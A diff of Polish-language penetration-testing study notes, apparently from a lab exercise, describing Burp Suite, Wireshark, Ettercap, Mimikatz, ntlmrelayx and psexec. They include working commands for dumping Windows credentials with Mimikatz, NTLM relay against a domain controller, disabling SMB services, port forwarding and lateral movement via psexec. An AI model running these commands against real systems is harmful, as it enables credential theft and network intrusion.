@@ -1,24 +1,36 @@
-BURP SUITE
+BURP SUITE:Nażędzie służące do testów penetracyjnych aplikacji internetowych. 
+1. Spider:przeszukiwacz sieciowy używany do mapowania docelowej aplikacji internetowej  2. Proxy:zawiera przechwytujące proxy  3. Intruder:Brute Force 4. Repeater:Sprawdzanie, czy wartości podane przez użytkownika są weryfikowane.
+5. Sequencer:sprawdza losowość tokenów generowanych przez serwer WWW 6. Decoder 7. Extender 8. Scanner
 
-WIRESHARK
+WIRESHARK:  analizator protokołów sieciowych
+https://www.wireshark.org/
 
 ETTERCAP:kompleksowy pakiet do ataków typu „man in the middle”(podszywanie się za jedną ze stron).Informacje uzyskane podczas ataku mogą zostać wykorzystane do wielu celów, w tym do kradzieży tożsamości, 
 niezatwierdzonych transferów środków lub nielegalnej zmiany hasła.
 Do analizy ruchu i identyfikacji możemy użyć WIRESHARKA.
 
-MIMIKATZ
+MIMIKATZ:która umożliwia użytkownikom przeglądanie i zapisywanie poświadczeń uwierzytelniających, takich jak bilety Kerberos
+https://www.varonis.com/blog/what-is-mimikatz
+privilege::debug
+token::elevate
+lsadump::sam
+mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit
+
+
 
 NTLMRELAY.py:Ten moduł wykonuje ataki SMB Relay pierwotnie odkryte przez cDc, rozszerzone na wiele protokołów docelowych (SMB, MSSQL, LDAP itp.). 
 Otrzymuje listę celów i dla każdego odebranego połączenia wybiera następny target i spróbuj przekazać poświadczenia. Ponadto, jeśli określono,
 najpierw spróbuje uwierzytelnić klienta łączącego się z nami.
 ntlmrelayx.py -t ldap://<IP> -smb2support --escalate-user <user>
 
-Najpierw trzeba wylaczyć usluge smb sc stop netlogon sc stop lanmanserverisc config lanmanserver start= disabled sc stop lanmanworkstationisc config lanmanworkstation start= disabled 
+Najpierw trzeba wylączyć usluge smb sc stop netlogon sc stop lanmanserverisc config lanmanserver start= disabled sc stop lanmanworkstationisc config lanmanworkstation start= disabled 
 Uruchomianie NTLMRelayX, określając kontroler domeny i protokół do wykorzystania, w tym przypadku SMB.
+
 ntlmrelayx.py -t smb://<DC> -smb2support -socks
 słychacz na metasploit na zatakwoanej maszynie na porcie SMB     portfwd add -R -L 0.0.0.0 -l 445 -p 445 
 Ustawiamy tunelwoanie, konfigurujemy proxychains dodajemy socks4 port (jezeli maszyna jest po za zasiegiem naszej maszyny ) 
 U uruchamiamy  proxychains psexec.py -no-pass HOLOLIVE/SRV-ADMIN@10.200.x.30
+
 PSEXEC.PY: pozwoli nam to na wykonywanie jednorazowych poleceń w nieinteraktywnej powłoce na docelowym systemie
 psexec.py -no-pass HOLOLIVE/SRV-ADMIN@ip
 https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
